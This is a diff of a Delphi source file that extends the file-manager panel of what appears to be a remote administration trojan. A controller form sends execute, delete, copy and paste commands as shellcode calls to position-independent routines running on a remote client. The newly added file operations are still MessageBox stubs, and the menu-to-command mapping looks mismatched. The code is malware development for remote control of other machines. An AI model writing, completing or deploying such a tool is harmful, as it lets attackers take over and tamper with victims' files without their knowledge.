@@ -5,7 +5,8 @@ interface
 uses
   Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
   Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ExtCtrls, Vcl.ComCtrls,
-  System.ImageList, Vcl.ImgList, Vcl.StdCtrls, untUtils, untClientObject;
+  System.ImageList, Vcl.ImgList, Vcl.StdCtrls, untUtils, untClientObject,
+  Vcl.Menus;
 
 type
   TForm2 = class(TForm)
@@ -19,12 +20,22 @@ type
     ListView2: TListView;
     edtPath: TEdit;
     cmbDrives: TComboBoxEx;
+    PopupMenu1: TPopupMenu;
+    ExecuteFile1: TMenuItem;
+    DeleteFile1: TMenuItem;
+    CopyFile1: TMenuItem;
+    CopyFile2: TMenuItem;
+    PasteFile1: TMenuItem;
     procedure cmbDrivesChange(Sender: TObject);
     procedure lstFilesCompare(Sender: TObject; Item1, Item2: TListItem;
       Data: Integer; var Compare: Integer);
     procedure lstFilesDblClick(Sender: TObject);
     procedure btnBackClick(Sender: TObject);
     procedure btnRefreshClick(Sender: TObject);
+    procedure ExecuteFile1Click(Sender: TObject);
+    procedure DeleteFile1Click(Sender: TObject);
+    procedure CopyFile1Click(Sender: TObject);
+    procedure PasteFile1Click(Sender: TObject);
   private
     { Private-Deklarationen }
   public
@@ -33,6 +44,7 @@ type
     procedure InitializeForm(pClientThread:TClientThread);
     procedure ProcessCommand(bCMD:Byte; strData:String);
     procedure SendListDirectories(strData:String);
+    procedure SendOperation(strID, strData:String);
   end;
 
 var
@@ -54,7 +66,7 @@ procedure pSendList(pConn:PConnRec; mBuff:PWideChar);
 var
   szDirectory, szFileInfo:Array[0..MAX_PATH] of WideChar;
   lpszSendBuffer:Pointer;
-  iFullLen, iStrLen: Integer;
+  iFullLen: Integer;
   hFindHandle:Cardinal;
   SearchRec: TWIN32FindDataW;
   sP: Array[0..5] of Char;
@@ -81,7 +93,6 @@ begin
     end;
   end;
 
-  iFullLen := 0;
   pConn.pAPI.xwsprintfW(szDirectory, @sP[0], mBuff);
 
   lpszSendBuffer := pConn.pAPI.xAllocMem(pConn.pAPI, 8192);
@@ -151,6 +162,26 @@ begin
   pConn.xSendBuffer(pConn, CMD_DRIVE_LIST, szDriveListBuffer, pConn.pAPI.xlstrlenW(szDriveListBuffer) * 2, False);
 end;
 
+procedure pExecuteFile(pConn:PConnRec; mBuff:PWideChar);
+begin
+  pConn.pAPI.xMessageBoxW(0,mBuff,nil,0);
+end;
+
+procedure pDeleteFile(pConn:PConnRec; mBuff:PWideChar);
+begin
+  pConn.pAPI.xMessageBoxW(0,mBuff,nil,0);
+end;
+
+procedure pRenameFile(pConn:PConnRec; mBuff:PWideChar);
+begin
+  pConn.pAPI.xMessageBoxW(0,mBuff,nil,0);
+end;
+
+procedure pCopyFile(pConn:PConnRec; mBuff:PWideChar);
+begin
+  pConn.pAPI.xMessageBoxW(0,mBuff,nil,0);
+end;
+
 procedure Filemanager(pConn:PConnRec; pData:Pointer; dwLen:Cardinal);stdcall;
 var
   bCMD:Char;
@@ -158,16 +189,32 @@ var
 begin
   bCMD := PChar(pData)^;
   pConn.pAPI.xMessageBoxW(0,pData,nil,0);
-  case bCMD of
-    'A':pListDrives(pConn);
-    'B':
-      begin
-        pPath := Pointer(DWORD(pData) + SizeOf(Char));
-        pSendList(pConn, pPath);
-      end;
-  end;
+  pPath := Pointer(DWORD(pData) + SizeOf(Char));
+  if bCMD = 'A' then
+    pListDrives(pConn)
+  else if bCMD = 'B' then
+    pSendList(pConn, pPath)
+  else if bCMD = 'C' then
+    pExecuteFile(pConn, pPath)
+  else if bCMD = 'D' then
+    pDeleteFile(pConn, pPath)
+  else if bCMD = 'E' then
+    pRenameFile(pConn, pPath)
+  else if bCMD = 'F' then
+    pCopyFile(pConn, pPath);
 end;
 procedure Filemanager_END();begin end;
+
+procedure TForm2.PasteFile1Click(Sender: TObject);
+begin
+  if lstFiles.Selected <> nil then
+  begin
+    if lstFiles.Selected.SubItems[1] <> 'Directory' then
+    begin
+      SendOperation('F', edtPath.Text + lstFiles.Selected.Caption);
+    end;
+  end;
+end;
 
 procedure TForm2.ProcessCommand(bCMD:Byte; strData:String);
 var
@@ -260,6 +307,24 @@ begin
   end;
 end;
 
+procedure TForm2.SendOperation(strID, strData:String);
+var
+  dwProcLen:Cardinal;
+  pShell:PShellCode;
+begin
+  strData := strID + strData;
+  dwProcLen := Length(strData) * 2;
+  GetMem(pShell, dwProcLen + SizeOf(TShellCode));
+  if pShell <> nil then
+  begin
+    pShell.dwLen := dwProcLen;
+    pShell.dwID := 1;
+    CopyMemory(Pointer(DWORD(pShell) + SizeOf(TShellCode) - SizeOf(Pointer)), PChar(strData), pShell.dwLen);
+    mClientThread.SendBuffer(CMD_SHELLCODE_CALL,pShell, dwProcLen + SizeOf(TShellCode) - SizeOf(Pointer));
+    FreeMem(pShell);
+  end;
+end;
+
 procedure TForm2.btnBackClick(Sender: TObject);
 begin
   if Length(edtPath.text) > 3 then
@@ -286,6 +351,39 @@ begin
     begin
       edtPath.Text := strDrive;
       SendListDirectories(strDrive);
+    end;
+  end;
+end;
+
+procedure TForm2.CopyFile1Click(Sender: TObject);
+begin
+  if lstFiles.Selected <> nil then
+  begin
+    if lstFiles.Selected.SubItems[1] <> 'Directory' then
+    begin
+      SendOperation('E', edtPath.Text + lstFiles.Selected.Caption);
+    end;
+  end;
+end;
+
+procedure TForm2.DeleteFile1Click(Sender: TObject);
+begin
+  if lstFiles.Selected <> nil then
+  begin
+    if lstFiles.Selected.SubItems[1] <> 'Directory' then
+    begin
+      SendOperation('D', edtPath.Text + lstFiles.Selected.Caption);
+    end;
+  end;
+end;
+
+procedure TForm2.ExecuteFile1Click(Sender: TObject);
+begin
+  if lstFiles.Selected <> nil then
+  begin
+    if lstFiles.Selected.SubItems[1] <> 'Directory' then
+    begin
+      SendOperation('C', edtPath.Text + lstFiles.Selected.Caption);
     end;
   end;
 end;
